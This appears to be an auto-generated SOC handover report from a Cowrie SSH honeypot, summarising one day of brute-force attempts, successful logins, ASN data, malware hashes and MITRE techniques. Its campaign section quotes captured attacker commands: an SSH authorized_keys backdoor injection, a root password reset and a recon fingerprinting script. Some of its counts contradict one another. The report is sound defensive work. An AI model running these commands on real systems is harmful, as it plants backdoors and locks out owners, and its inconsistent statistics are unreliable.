# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-19 |
| **Generated At** | 2026-03-19T22:26:52Z |
| **Shift Time** | 22:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **594** |
| Confirmed Threats | **0** |
| False Positives Filtered | **594** (100.0%) |
| Unique Attacker IPs | **211** |
| Countries of Origin | **0** |
| High Severity Cases | **60** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **534** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **294** |
| Unique Credential Pairs | **233** |
| Unique Usernames | **151** |
| Unique Passwords | **185** |
| Successful Auth Pairs | **54** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 68 |
| `345gs5662d34` | 16 |
| `admin` | 11 |
| `guest` | 6 |
| `support` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 17 |
| `345gs5662d34` | 16 |
| `123456` | 12 |
| `password` | 12 |
| `12345` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 17 |
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `admin` | 4 |
| `root` | `` | 4 |
| `root` | `P@ssw0rd!2025` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789` | `38.250.116.128` | 2026-03-19T00:55:32 |
| `root` | `password` | `38.250.116.128` | 2026-03-19T00:56:49 |
| `root` | `admin` | `38.250.116.128` | 2026-03-19T00:57:49 |
| `root` | `12345` | `38.250.116.128` | 2026-03-19T00:58:53 |
| `root` | `Ww123456..` | `45.132.19.15` | 2026-03-19T02:30:14 |
| `root` | `qwe@123456` | `101.36.122.186` | 2026-03-19T03:21:44 |
| `root` | `3245gs5662d34` | `101.36.122.186` | 2026-03-19T03:21:47 |
| `root` | `121212` | `101.36.122.186` | 2026-03-19T03:47:04 |
| `root` | `2222` | `118.45.101.159` | 2026-03-19T04:22:18 |
| `root` | `2222` | `106.201.230.195` | 2026-03-19T04:22:25 |
| `root` | `P@ssw0rd!2025` | `61.240.156.16` | 2026-03-19T05:48:09 |
| `root` | `P@ssw0rd!2025` | `113.219.244.16` | 2026-03-19T05:48:11 |
| `root` | `3245gs5662d34` | `61.240.156.16` | 2026-03-19T05:48:13 |
| `root` | `3245gs5662d34` | `113.219.244.16` | 2026-03-19T05:48:15 |
| `root` | `wang12345` | `118.127.40.41` | 2026-03-19T05:53:29 |
| `root` | `3245gs5662d34` | `118.127.40.41` | 2026-03-19T05:53:33 |
| `root` | `pass` | `197.242.170.10` | 2026-03-19T05:58:07 |
| `root` | `P@ssw0rd!2025` | `118.127.40.41` | 2026-03-19T06:12:33 |
| `root` | `admin` | `112.163.119.199` | 2026-03-19T07:26:02 |
| `root` | `Asd123321` | `14.103.41.98` | 2026-03-19T08:05:08 |
| `root` | `P@ssword` | `112.86.146.178` | 2026-03-19T08:57:54 |
| `root` | `Password@2025` | `161.35.87.209` | 2026-03-19T09:13:15 |
| `root` | `3245gs5662d34` | `161.35.87.209` | 2026-03-19T09:13:23 |
| `root` | `!@#qwe123` | `196.29.34.170` | 2026-03-19T09:37:21 |
| `root` | `3245gs5662d34` | `196.29.34.170` | 2026-03-19T09:37:28 |
| `root` | `admin` | `116.110.18.236` | 2026-03-19T09:59:18 |
| `root` | `@` | `116.110.21.177` | 2026-03-19T10:01:46 |
| `root` | `Azerty123` | `118.193.39.127` | 2026-03-19T10:10:07 |
| `root` | `3245gs5662d34` | `118.193.39.127` | 2026-03-19T10:10:10 |
| `root` | `ABCabc123456` | `118.193.39.127` | 2026-03-19T10:12:07 |
| `root` | `ubuntu` | `154.210.208.250` | 2026-03-19T11:40:22 |
| `root` | `123456789` | `159.223.14.88` | 2026-03-19T14:38:31 |
| `root` | `password` | `159.223.14.88` | 2026-03-19T14:39:27 |
| `root` | `admin` | `159.223.14.88` | 2026-03-19T14:40:24 |
| `root` | `12345` | `159.223.14.88` | 2026-03-19T14:41:21 |
| `root` | `1234` | `159.223.14.88` | 2026-03-19T14:42:13 |
| `root` | `123` | `159.223.14.88` | 2026-03-19T14:43:03 |
| `root` | `raspberry` | `112.194.142.167` | 2026-03-19T16:43:51 |
| `root` | `online@123` | `78.42.241.233` | 2026-03-19T16:59:58 |
| `root` | `3245gs5662d34` | `78.42.241.233` | 2026-03-19T17:00:01 |
| `root` | `helloworld` | `78.42.241.233` | 2026-03-19T17:05:14 |
| `root` | `A1qwerty` | `101.36.123.173` | 2026-03-19T17:08:56 |
| `root` | `3245gs5662d34` | `101.36.123.173` | 2026-03-19T17:08:59 |
| `root` | `x` | `101.36.123.173` | 2026-03-19T19:16:12 |
| `root` | `root44` | `112.25.140.211` | 2026-03-19T19:18:31 |
| `root` | `root44` | `197.156.97.198` | 2026-03-19T19:18:40 |
| `root` | `x` | `101.36.124.127` | 2026-03-19T19:21:12 |
| `root` | `3245gs5662d34` | `101.36.124.127` | 2026-03-19T19:21:15 |
| `root` | `1` | `60.166.8.174` | 2026-03-19T20:13:04 |
| `root` | `Test2020` | `118.193.37.79` | 2026-03-19T20:20:52 |
| `root` | `3245gs5662d34` | `118.193.37.79` | 2026-03-19T20:20:55 |
| `root` | `!@34QWer` | `101.126.11.137` | 2026-03-19T20:52:08 |
| `root` | `P@ssw0rD` | `118.193.37.79` | 2026-03-19T20:54:52 |
| `root` | `ubuntu` | `60.165.119.59` | 2026-03-19T21:53:16 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 10 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:vN2jocf5s6nH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.11.137`, `14.103.41.98`, `45.132.19.15`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
Source IPs: `38.250.116.128`, `159.223.14.88`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.219.244.16`, `101.36.122.186`, `118.193.39.127`, `61.240.156.16`, `118.127.40.41`, `161.35.87.209`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **211** |
| Unique ASNs | **101** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 15 | LOW |
| `AS4766` | Korea Telecom | 10 | LOW |
| `AS4134` | CHINANET-BACKBONE | 9 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 8 | LOW |
| `AS46562` | Performive LLC | 8 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 8 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 7 | LOW |
| `AS63949` | Akamai Connected Cloud | 6 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 409 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 226 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 60 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |

---

## 🔕 False Positive Summary (594 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 594 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 594 cases |
| Tool 34  | Credential Extractor        | ✅ 294 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 211 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 594 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 101 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-19T22:26:52Z_
